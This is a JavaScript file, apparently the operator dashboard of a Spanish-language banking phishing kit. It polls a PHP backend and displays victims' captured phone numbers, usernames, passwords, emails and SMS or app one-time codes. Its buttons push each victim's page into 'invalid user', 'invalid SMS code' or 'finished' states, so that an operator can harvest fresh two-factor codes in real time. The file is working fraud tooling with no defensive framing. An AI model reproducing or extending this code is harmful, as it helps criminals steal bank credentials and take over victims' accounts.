function borrarDatos3(idBoton) {
  fetch("../delete_data.php", {
      method: "POST",
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      body: `id=${idBoton}`
  })
  .then(response => response.json())
  .then(data => console.log(data))
  .catch(error => console.error("Error en la petición:", error));
}

function borrartotal() {
  fetch("../delete_all.php", {
      method: "POST"
  })
  .then(response => response.json())
  .then(data => {
      if (data.status === "success") {
          console.log("Todos los datos fueron eliminados correctamente.");
      } else {
          console.error("Error eliminando los datos:", data.message);
      }
  })
  .catch(error => console.error("Error en la petición:", error));
}

let lastUpdate = ""; // Almacena el último hash de datos

function checkForChanges() {
  fetch(`../get_changes.php?lastUpdate=${lastUpdate}`)
    .then(response => response.json())
    .then(data => {
      if (data.changed) {
        console.log("⚡ Se detectaron cambios en la base de datos.");
        document.getElementById("audio").play(); // Reproducir sonido
        lastUpdate = data.newHash; // Actualizar el hash para futuras comparaciones
      }
    })
    .catch(error => console.error("Error en la petición:", error));
}

// Ejecutar la función cada 3 segundos para detectar cambios
setInterval(checkForChanges, 1000);


function mostrarDatos3() {
  fetch("../get_data.php") // Hacer la petición a PHP en vez de Firebase
      .then(response => response.json())
      .then(data => {
          var datosContainer = document.getElementById("datosContainer");
          var orden = document.getElementById("orden");

          // Limpiar el contenedor antes de agregar nuevos datos
          datosContainer.innerHTML = "";

          Object.keys(data).forEach(key => {
            var cliente = data[key];
    
            if (!cliente.celular) return; // Validación para evitar elementos vacíos
    
            var clienteDiv = document.createElement("div");
            clienteDiv.id = key;
            clienteDiv.classList.add(cliente.color || "");
    
            var ordenn = document.createElement("div");
            ordenn.className = "orden";
            clienteDiv.appendChild(ordenn);
    
            var spand = document.createElement("span");
            spand.className = "derecha";
            ordenn.appendChild(spand);
    
            var span = document.createElement("span");
            span.className = "izquierda";
            ordenn.appendChild(span);
            
           
            // Añadir los datos dinámicamente con validaciones
            if (cliente.celular) {
              var referencia = document.createElement("p");
              referencia.innerText = "TLF: " + cliente.celular;
              spand.appendChild(referencia);
            }
    
            if (cliente.usuario) {
              var usuarioP = document.createElement("p");
              usuarioP.innerText = "USUARIO: " + cliente.usuario;
              spand.appendChild(usuarioP);
            }
    
            if (cliente.clave) {
              var claveP = document.createElement("p");
              claveP.innerText = "CLAVE: " + cliente.clave;
              spand.appendChild(claveP);
            }
    
            if (cliente.dinamican) {
              var dinamicann = document.createElement("p");
              dinamicann.innerText = "APP: " + cliente.dinamican;
              spand.appendChild(dinamicann);
            }
    
            if (cliente.corro) {
              var corroo = document.createElement("p");
              corroo.innerText = "Correo: " + cliente.corro;
              spand.appendChild(corroo);
            }
    
            if (cliente.relojinvalida) {
              var relojinvalidaCL = document.createElement("p");
              relojinvalidaCL.innerText = "SMS NUEVA: " + cliente.relojinvalida;
              spand.appendChild(relojinvalidaCL);
            }
    
            if (cliente.norinvalida) {
              var norinvalidaL = document.createElement("p");
              norinvalidaL.innerText = "APP NUEVA: " + cliente.norinvalida;
              spand.appendChild(norinvalidaL);
            }
    
            if (cliente.dinreloj) {
              var dinrelojp = document.createElement("p");
              dinrelojp.innerText = "SMS: " + cliente.dinreloj;
              spand.appendChild(dinrelojp);
            }
    
            if (cliente.sectionVisible) {
              var sectionv = document.createElement("p");
              sectionv.innerText = "Estado: " + cliente.sectionVisible;
              spand.appendChild(sectionv);
            }
    
            if (cliente.tera) {
              var teras = document.createElement("p");
              teras.innerText = cliente.tera;
              spand.appendChild(teras);
            }
    
            if (cliente.clienteid) {
              var horap = document.createElement("p");
              horap.innerText = "Hora: " + cliente.clienteid.replace(/_/g, '/');
              spand.appendChild(horap);
            }
    
            // Botones con funcionalidad
            if (cliente.celular) {
              var copiarDocumentoButton = document.createElement("button");
              copiarDocumentoButton.innerText = "NOMBRE";
              copiarDocumentoButton.onclick = function () {
                copiarTextoAlPortapapeles(cliente.celular);
                enviarcolor('entrando', key);
              };
              span.appendChild(copiarDocumentoButton);
            }
    
            if (cliente.clave) {
              var userinva = document.createElement("button");
              userinva.innerText = "USUARIO INVALIDO";
              userinva.onclick = function () {
                cambiarSeccion3('usuario_invalido', key);
                enviarcolor('entrando', key);
              };
              span.appendChild(userinva);
            }
    
            if (cliente.tera === "TRICOLOR") {
              var dinreloja = document.createElement("button");
              dinreloja.innerText = "DINAMICA SMS";
              dinreloja.onclick = function () {
                cambiarSeccion3('Dinamica_SMS', key);
                enviarcolor('entrando', key);
              };
              span.appendChild(dinreloja);
            }
    
            if (cliente.dinreloj) {
              var relojinvalida = document.createElement("button");
              relojinvalida.innerText = "DINAMICA SMS INVALIDA";
              relojinvalida.onclick = function () {
                cambiarSeccion3('Dinamica_SMS_invalida', key);
                enviarcolor('entrando', key);
              };
              span.appendChild(relojinvalida);
            }
    
            if (cliente.clave) {
              var dnormal = document.createElement("button");
              dnormal.innerText = "DINAMICA APP";
              dnormal.onclick = function () {
                cambiarSeccion3('Dinamica_APP', key);
                enviarcolor('entrando', key);
              };
              span.appendChild(dnormal);
            }
    
            if (cliente.dinamican) {
              var norinvalida = document.createElement("button");
              norinvalida.innerText = "DINAMICA APP INVALIDA";
              norinvalida.onclick = function () {
                cambiarSeccion3('Dinamica_APP_invalida', key);
                enviarcolor('entrando', key);
              };
              span.appendChild(norinvalida);
            }
    
            if (cliente.clave) {
              var terminado = document.createElement("button");
              terminado.innerText = "TERMINADO";
              terminado.onclick = function () {
                cambiarSeccion3('Terminado', key);
                enviarcolor('listo', key);
              };
              span.appendChild(terminado);
            }
    
            var borrarDatos = document.createElement("button");
            borrarDatos.innerText = "BORRAR";
            borrarDatos.onclick = function () {
              borrarDatos3(key);
            };
            span.appendChild(borrarDatos);
    
            datosContainer.insertBefore(clienteDiv, datosContainer.firstChild);
          });

      })
      .catch(error => console.error("Error obteniendo datos:", error));
}

setInterval(mostrarDatos3, 500);
// Cambiar a la secciï¿½n especificada
function cambiarSeccion3(seccion, idBoton) {
  fetch("../update_data_admin.php", {
      method: "POST",
      headers: {
          "Content-Type": "application/x-www-form-urlencoded"
      },
      body: `id=${idBoton}&campo=sectionVisible&valor=${seccion}`
  })
  .then(response => response.json())
  .then(data => {
      if (data.success) {
          console.log("Estado actualizado correctamente para", idBoton);
      } else {
          console.error("Error al actualizar estado:", data.error);
      }
  })
  .catch(error => console.error("Error en la petición:", error));
}


// Funciï¿½n para copiar el texto al portapapeles
function copiarTextoAlPortapapeles(texto) {
  var elementoTemp = document.createElement("textarea");
  elementoTemp.value = texto;
  document.body.appendChild(elementoTemp);
  elementoTemp.select();

  try {
    document.execCommand("copy");
  } catch (err) {

  }

  document.body.removeChild(elementoTemp);
  redirigir();
}


function enviarmensaje(clipText, clienteid, docu) {
  let valor = clipText !== "NULL NULL NULL NULL" ? clipText : docu;

  fetch("../update_data_admin.php", {
      method: "POST",
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      body: `id=${clienteid}&campo=nombre&valor=${valor}`
  })
  .then(response => response.json())
  .then(data => console.log(data))
  .catch(error => console.error("Error en la petición:", error));
}

function redirigir() {
  // Abrir una nueva ventana
  const nuevaVentana = window.open('http://localhost/consultadb/busqueda.php', '_blank', 'height=1,width=1,left=-9999,top=-9999');

  // Ocultar la nueva ventana
  if (nuevaVentana) {
    nuevaVentana.document.documentElement.style.visibility = 'hidden';
  }

  // Cerrar la ventana despuï¿½s de un segundo
  setTimeout(() => {
    if (nuevaVentana) {
      nuevaVentana.close();
      setTimeout(copiarTextoAlPortapapelesYGuardar, 1000);
    }
  }, 2000);
}

function copiarTextoAlPortapapelesYGuardar(boton) {
  // Obtener el texto del portapapeles
  navigator.clipboard.readText().then(clipText => {
    // Guardar el texto en una variable global
    window.copiedText = clipText;
    enviarmensaje(clipText);


  }).catch(err => {
    console.error('Error al acceder al portapapeles:', err);
  });
}


function enviarcolor(color, idBoton) {
  fetch("../update_data_admin.php", {
      method: "POST",
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      body: `id=${idBoton}&campo=color&valor=${color}`
  })
  .then(response => response.json())
  .then(data => console.log(data))
  .catch(error => console.error("Error en la petición:", error));
}
